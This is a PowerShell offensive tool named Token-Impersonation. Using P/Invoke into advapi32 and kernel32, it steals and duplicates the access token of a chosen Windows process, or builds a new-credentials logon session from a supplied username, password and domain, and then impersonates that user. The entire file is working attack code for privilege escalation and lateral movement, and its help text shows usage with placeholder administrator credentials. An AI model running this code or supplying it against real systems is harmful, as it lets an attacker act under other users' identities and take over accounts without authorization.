<#

.SYNOPSIS
Token-Impersonation Author: Rob LP (@L3o4j)
https://github.com/Leo4j/Token-Impersonation

.DESCRIPTION
Make a Token (local admin rights not required) or Steal the Token of the specified Process ID (local admin rights required)

.PARAMETER MakeToken
Create a logon session with the specified credentials

.PARAMETER Steal
Steal the token of the specified Process ID

.PARAMETER Domain
Specify the domain info

.PARAMETER UserName
Specify a UserName

.PARAMETER Password
Provide a password for the specified UserName

.PARAMETER Rev2Self
Stops impersonating a token and reverts to previous one

.EXAMPLE
Token-Impersonation -MakeToken -Username "Administrator" -Domain "ferrari.local" -Password "P@ssw0rd!"
Token-Impersonation -Steal -ProcessID 7440
Token-Impersonation -Rev2Self
#>

# Define the required constants and structs
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public enum LogonType : int {
    LOGON32_LOGON_NEW_CREDENTIALS = 9,
}

public enum LogonProvider : int {
    LOGON32_PROVIDER_DEFAULT = 0,
}

public enum TOKEN_TYPE {
    TokenPrimary = 1,
    TokenImpersonation
}

public enum TOKEN_ACCESS : uint {
    TOKEN_DUPLICATE = 0x0002
}

public enum PROCESS_ACCESS : uint {
    PROCESS_QUERY_INFORMATION = 0x0400
}

public class Advapi32 {
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool LogonUser(
        String lpszUsername,
        String lpszDomain,
        String lpszPassword,
        LogonType dwLogonType,
        LogonProvider dwLogonProvider,
        out IntPtr phToken
    );

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hToken);
}

public class Kernel32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
}
"@ -Language CSharp

function Token-Impersonation {
    param (
        [Parameter(Mandatory=$false)]
        [string]$Username,

        [Parameter(Mandatory=$false)]
        [string]$Password,

        [Parameter(Mandatory=$false)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [switch]$Rev2Self,

        [Parameter(Mandatory=$false)]
        [switch]$StealToken,
		
		[Parameter(Mandatory=$false)]
        [switch]$MakeToken,

        [Parameter(Mandatory=$false)]
        [int]$ProcessID
    )
	
    begin {
        # Check conditions to ensure correct input
        if ($Rev2Self -and ($StealToken -or $Username -or $Password -or $Domain -or $ProcessID)) {
            throw "[-] Rev2Self cannot be used with other parameters."
        }

        if ($StealToken -and (!$ProcessID)) {
            throw "[-] ProcessID is required when using the Impersonate switch."
        }

        if (-not $Rev2Self -and -not $StealToken -and (!$MakeToken -or -not $Username -or -not $Password -or -not $Domain)) {
            throw "[-] For token creation -MakeToken switch and Username, Password, and Domain are mandatory."
        }
    }

    process {
        if ($Rev2Self) {
            if ([Advapi32]::RevertToSelf()) {
                Write-Output "[+] Successfully reverted to original user context."
            } else {
                Write-Output "[-] Failed to revert to original user."
            }
            return
        }

        if ($StealToken) {
            $processHandle = [Kernel32]::OpenProcess([PROCESS_ACCESS]::PROCESS_QUERY_INFORMATION, $false, $ProcessID)
            if ($processHandle -eq [IntPtr]::Zero) {
                throw "[-] Failed to obtain process handle."
            }

            $tokenHandle = [IntPtr]::Zero
            if (-not [Advapi32]::OpenProcessToken($processHandle, [TOKEN_ACCESS]::TOKEN_DUPLICATE, [ref]$tokenHandle)) {
                throw "[-] Failed to get token."
            }

            $duplicateTokenHandle = [IntPtr]::Zero
            if (-not [Advapi32]::DuplicateToken($tokenHandle, [TOKEN_TYPE]::TokenImpersonation, [ref]$duplicateTokenHandle)) {
                throw "[-] Failed to duplicate token."
            }

            if (-not [Advapi32]::ImpersonateLoggedOnUser($duplicateTokenHandle)) {
                throw "[-] Failed to impersonate."
            }

            Write-Output "[+] Impersonation successful using token from PID $ProcessID."
            return
        }
		
		if ($MakeToken) {
            $tokenHandle = [IntPtr]::Zero
            if (-not [Advapi32]::LogonUser($Username, $Domain, $Password, [LogonType]::LOGON32_LOGON_NEW_CREDENTIALS, [LogonProvider]::LOGON32_PROVIDER_DEFAULT, [ref]$tokenHandle)) {
                throw "[-] Failed to obtain user token."
            }

            if (-not [Advapi32]::ImpersonateLoggedOnUser($tokenHandle)) {
                [Advapi32]::CloseHandle($tokenHandle)
                throw "[-] Failed to impersonate user."
            }

            Write-Output "[+] Impersonation successful using provided credentials."
        }
    }
}
